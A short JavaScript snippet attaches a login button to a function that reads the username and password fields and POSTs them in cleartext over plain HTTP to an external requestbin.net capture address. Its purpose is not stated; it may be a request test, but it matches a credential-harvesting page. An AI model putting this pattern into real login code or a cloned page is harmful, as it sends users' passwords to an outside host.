function doLogin(){
    const ajax = new XMLHttpRequest();
    ajax.open("POST", "http://h788m1xckjg1sj6n.b.requestbin.net");
    ajax.onload = function(){
        console.log(ajax.responseText);
    }

    ajax.setRequestHeader("Content-Type", "application/json");
    ajax.send(JSON.stringify({
        username: document.getElementById("username").value,
        password: document.getElementById("password").value
    }));
}

document.getElementById("login").onclick = doLogin;